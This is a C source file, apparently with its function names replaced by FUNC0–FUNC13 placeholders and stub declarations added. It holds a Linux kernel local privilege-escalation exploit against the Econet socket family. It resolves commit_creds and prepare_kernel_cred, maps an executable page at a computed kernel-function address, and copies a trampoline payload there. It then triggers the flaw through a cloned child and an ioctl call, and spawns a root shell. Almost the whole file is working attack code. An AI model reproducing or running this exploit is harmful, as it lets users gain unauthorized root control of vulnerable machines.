#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  scalar_t__ _prepare_kernel_cred ;
typedef  scalar_t__ _commit_creds ;

/* Variables and functions */
 int CLONE_CHILD_CLEARTID ; 
 int CLONE_VM ; 
 int MAP_ANONYMOUS ; 
 int MAP_FIXED ; 
 int MAP_PRIVATE ; 
 unsigned long OFFSET ; 
 int /*<<< orphan*/  O_RDONLY ; 
 int /*<<< orphan*/  PF_ECONET ; 
 int PROT_EXEC ; 
 int PROT_READ ; 
 int PROT_WRITE ; 
 unsigned long SHIFT ; 
 int SIGCHLD ; 
 int /*<<< orphan*/  SOCK_DGRAM ; 
 int /*<<< orphan*/  FUNC0 (int (*) (void*),void*,int,int**,int /*<<< orphan*/ *,int /*<<< orphan*/ *,unsigned long) ; 
 scalar_t__ commit_creds ; 
 int /*<<< orphan*/  FUNC1 (char*,char*,int /*<<< orphan*/ *) ; 
 unsigned long FUNC2 (char*) ; 
 scalar_t__ FUNC3 () ; 
 int /*<<< orphan*/  FUNC4 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 void* FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (void*,int /*<<< orphan*/ *,int) ; 
 void* FUNC7 (void*,int,int,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC8 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (int*) ; 
 scalar_t__ prepare_kernel_cred ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (int) ; 
 int FUNC12 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  trampoline ; 
 scalar_t__ trigger ; 

int FUNC13(int argc, char * argv[])
{
        unsigned long econet_ops, econet_ioctl, target, landing;
        int fildes[4], pid;
        void * newstack, * payload;

        /* Create file descriptors now so there are two
           references to them after cloning...otherwise
           the child will never return because it
           deadlocks when trying to unlock various
           mutexes after OOPSing */
        FUNC9(fildes);
        fildes[2] = FUNC12(PF_ECONET, SOCK_DGRAM, 0);
        fildes[3] = FUNC8("/dev/zero", O_RDONLY);

        if(fildes[0] < 0 || fildes[1] < 0 || fildes[2] < 0 || fildes[3] < 0) {
                FUNC10("[*] Failed to open file descriptors.\n");
                return -1;
        }

        /* Resolve addresses of relevant symbols */
        FUNC10("[*] Resolving kernel addresses...\n");
        econet_ioctl = FUNC2("econet_ioctl");
        econet_ops = FUNC2("econet_ops");
        commit_creds = (_commit_creds) FUNC2("commit_creds");
        prepare_kernel_cred = (_prepare_kernel_cred) FUNC2("prepare_kernel_cred");

        if(!econet_ioctl || !commit_creds || !prepare_kernel_cred || !econet_ops) {
                FUNC10("[*] Failed to resolve kernel symbols.\n");
                return -1;
        }

        if(!(newstack = FUNC5(65536))) {
                FUNC10("[*] Failed to allocate memory.\n");
                return -1;
        }

        FUNC10("[*] Calculating target...\n");
        target = econet_ops + 10 * sizeof(void *) - OFFSET;

        /* Clear the higher bits */
        landing = econet_ioctl << SHIFT >> SHIFT;

        payload = FUNC7((void *)(landing & ~0xfff), 2 * 4096,
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);

        if ((long)payload == -1) {
                FUNC10("[*] Failed to mmap() at target address.\n");
                return -1;
        }

        FUNC6((void *)landing, &trampoline, 1024);

        FUNC0((int (*)(void *))trigger,
              (void *)((unsigned long)newstack + 65536),
              CLONE_VM | CLONE_CHILD_CLEARTID | SIGCHLD,
              &fildes, NULL, NULL, target);

        FUNC11(1);

        FUNC10("[*] Triggering payload...\n");
        FUNC4(fildes[2], 0, NULL);

        if(FUNC3()) {
                FUNC10("[*] Exploit failed to get root.\n");
                return -1;
        }

        FUNC10("[*] Got root!\n");
        FUNC1("/bin/sh", "/bin/sh", NULL);
}